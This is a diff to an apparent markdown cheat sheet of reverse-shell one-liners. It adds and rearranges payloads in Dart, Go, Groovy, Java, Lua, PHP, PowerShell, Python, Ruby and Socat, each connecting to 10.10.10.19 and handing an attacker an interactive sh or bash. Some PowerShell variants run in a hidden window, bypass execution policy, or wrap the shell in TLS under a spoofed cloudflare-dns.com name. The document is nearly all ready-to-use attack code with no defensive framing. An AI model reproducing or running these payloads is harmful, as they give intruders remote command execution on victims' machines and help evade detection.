@@ -106,29 +106,6 @@ int main()
 }
 ```
 
-### Dart
-
-```dart
-import 'dart:io';
-import 'dart:convert';
-
-main() {
-  Socket.connect("10.10.10.19", 7878).then((socket) {
-    socket.listen((data) {
-      Process.start('sh', []).then((Process process) {
-        process.stdin.writeln(new String.fromCharCodes(data).trim());
-        process.stdout
-          .transform(utf8.decoder)
-          .listen((output) { socket.write(output); });
-      });
-    },
-    onDone: () {
-      socket.destroy();
-    });
-  });
-}
-```
-
 ### C# <a href="#ruby" id="ruby"></a>
 
 ```csharp
@@ -203,10 +180,39 @@ namespace ConnectBack
 }
 ```
 
+### Dart
+
+```dart
+import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect("10.10.10.19", 7878).then((socket) {
+    socket.listen((data) {
+      Process.start('sh', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}
+```
+
 ### Golang <a href="#ruby" id="ruby"></a>
 
 ```go
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.19:7878");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+
+### Groovy <a href="#java" id="java"></a>
+
+```groovy
+String host="10.10.10.19";int port=7878;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 ### Haskell <a href="#java" id="java"></a>
@@ -221,19 +227,83 @@ main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 10.10.1
 
 ### Java <a href="#java" id="java"></a>
 
+#### Basic
+
 ```java
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.19/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
+public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.10.19/7878 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+```
+
+#### ProcessBuilder
+
+```java
+public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/10.10.10.19/7878 0>&1")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+```
+
+#### Longest
+
+```
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class shell {
+    public static void main(String[] args) {
+        String host = "10.10.10.19";
+        int port = 7878;
+        String cmd = "sh";
+        try {
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while (!s.isClosed()) {
+                while (pi.available() > 0)
+                    so.write(pi.read());
+                while (pe.available() > 0)
+                    so.write(pe.read());
+                while (si.available() > 0)
+                    po.write(si.read());
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {}
+            }
+            p.destroy();
+            s.close();
+        } catch (Exception e) {}
+    }
+}
 ```
 
 ### Lua
 
 ```lua
---Type 1
+--1
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.19','7878');os.execute('sh -i <&3 >&3 2>&3');"
 
---Type 2
+--2
 lua5.1 -e 'local host, port = "10.10.10.19", 7878 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 
@@ -310,39 +380,66 @@ php -r '$sock=fsockopen("10.10.10.19",7878);system("sh <&3 >&3 2>&3");'
 #passthru
 php -r '$sock=fsockopen("10.10.10.19",7878);passthru("sh <&3 >&3 2>&3");'
 
-#``php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'
+#`
+php -r '$sock=fsockopen("10.10.10.19",7878);`sh <&3 >&3 2>&3`;'
+
+#popen
+php -r '$sock=fsockopen("10.10.10.19",7878);popen("sh <&3 >&3 2>&3", "r");'
+
+#proc_open
+php -r '$sock=fsockopen("10.10.10.19",7878);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
 
 ### Powershell <a href="#powershell" id="powershell"></a>
 
-```scheme
-powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient('10.10.10.19',7878);$str = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $str.Read($b,0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"
+```powershell
+#1
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.19",7878);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+#2
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.19',7878);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#3
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.19', 7878);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+
+#tls
+powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.19', 7878);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
 ```
 
 ### Python <a href="#python" id="python"></a>
 
 ```bash
-#Type 1
+#1
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.19",7878));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'​
 
-#Type 2
+#2
 export RHOST="10.10.10.19";export RPORT=7878;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+#short
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.19",7878));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
 ### Ruby <a href="#ruby" id="ruby"></a>
 
 ```bash
-#Type 1
+#1
+ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.10.19",7878))'
+
+#2
 ruby -rsocket -e'f=TCPSocket.open("10.10.10.19",7878).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
-​#Type 2
+​#no sh
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.19","7878");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
 ### Socat <a href="#socat" id="socat"></a>
 
 ```bash
+#basic
 socat TCP:10.10.10.19:7878 EXEC:sh
+
+#tty
+socat TCP:10.10.10.19:7878 EXEC:'sh',pty,stderr,setsid,sigint,sane
 ```
 
 ### Telnet <a href="#telnet" id="telnet"></a>
